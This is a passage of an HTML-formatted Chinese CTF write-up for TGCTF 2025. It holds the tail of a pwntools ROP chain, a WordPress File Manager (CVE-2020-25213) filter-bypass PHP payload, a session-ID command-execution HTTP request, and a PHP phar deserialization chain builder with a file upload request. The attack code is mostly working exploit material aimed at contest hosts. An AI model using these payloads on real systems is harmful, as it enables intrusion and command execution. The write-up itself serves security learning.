class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000471350</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># add rax, 1 ; ret</span>\np <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0000000000401ce4</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># syscall</span>\nio<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\nio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>打到账密。TG_wordpressor, aXx^oV@K&amp;cFoVatzQ*</p>\n<p>进去之后发现filemanager 6.0。直接一眼顶针了。CVE-2020-25213。</p>\n<p>配置文件有过滤。可以使用如下绕过：</p>\n<pre class=\"language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?=</span> <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'sys'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'tem'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'cat /f*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></code></pre>\n\n<p>打进去就有了。</p>\n<h3 id=\"AAA偷渡阴平（复仇）\"><a href=\"#AAA偷渡阴平（复仇）\" class=\"headerlink\" title=\"AAA偷渡阴平（复仇）\"></a>AAA偷渡阴平（复仇）</h3><p>没有禁止session相关。</p>\n<p>payload:</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/?tgctf2025=session_id();session_start();system(hex2bin(session_id()));</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node2.tgctf.woooo.tech:32385</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">PHPSESSID=636174202f662a</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span></code></pre>\n\n<h3 id=\"什么文件上传？（复仇）\"><a href=\"#什么文件上传？（复仇）\" class=\"headerlink\" title=\"什么文件上传？（复仇）\"></a>什么文件上传？（复仇）</h3><p>file_exists可以出发phar。易得：</p>\n<pre class=\"language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">yesterday</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$learn</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$study</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"study\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$try</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">learn</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"learn&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You studied hard yesterday.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">study</span><span class=\"token operator\">-></span><span class=\"token function\">hard</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">today</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$doing</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$did</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$done</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">did</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"What you did makes you outstanding.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">done</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"And what you've done has given you a choice.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">done</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">doing</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">doing</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">doing</span><span class=\"token operator\">-></span><span class=\"token property\">better</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">tommoraw</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$good</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$bad</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$soso</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">good</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"You'll be good tommoraw!&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">good</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">bad</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"You'll be bad tommoraw!&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">future</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$impossible</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"How can you get here?&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$no</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$useful1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful2</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful3</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful4</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful5</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful6</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful7</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful8</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful9</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful10</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful11</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful12</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful13</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful14</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful15</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful16</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful17</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful18</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful19</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful20</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">out</span><span class=\"token operator\">-></span><span class=\"token property\">useful7</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Seven is my lucky number&lt;br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'whoami'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"This is your future.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"wow\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"win\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">no</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">no</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">yesterday</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">study</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">today</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token property\">study</span> <span class=\"token operator\">-></span> <span class=\"token property\">doing</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">future</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 后缀必须为phar</span>\n<span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"evil.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 设置 stubb</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"GIF89a&lt;?php __HALT_COMPILER(); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/**\n将自定义的 meta-data 存入 manifest\n这个函数需要在php.ini中修改 phar.readonly 为 Off\n否则的话会抛出 \ncreating archive \"***.phar\" disabled by the php.ini setting phar.readonly \n异常.\n*/</span>\n<span class=\"token variable\">$$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 添加需压缩的文件</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span></code></pre>\n\n<p>随后上传。在不是复仇那个版本读到uploads.php。发现源码如下：</p>\n<pre class=\"language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$uploadDir</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'uploads/'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploadDir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploadDir</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0777</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 白名单允许的扩展名</span>\n    <span class=\"token variable\">$allowedExtensions</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'atg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$fileName</span> <span class=\"token operator\">=</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$fileExtension</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PATHINFO_EXTENSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 检查文件扩展名</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileExtension</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allowedExtensions</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token variable\">$uploadFile</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$uploadDir</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$fileName</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$uploadFile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件已保存到：<span class=\"token interpolation\"><span class=\"token variable\">$uploadFile</span></span> ！\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"文件保存出错！\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre>\n\n<p>允许上传atg文件。</p>\n<p>后面易得：</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/upload.php</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:30759</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">940</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:30759</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundary1OUR0mqZmZ8AtAOc</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:30759/</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\n------WebKitFormBoundary1OUR0mqZmZ8AtAOc\n<span class=\"token 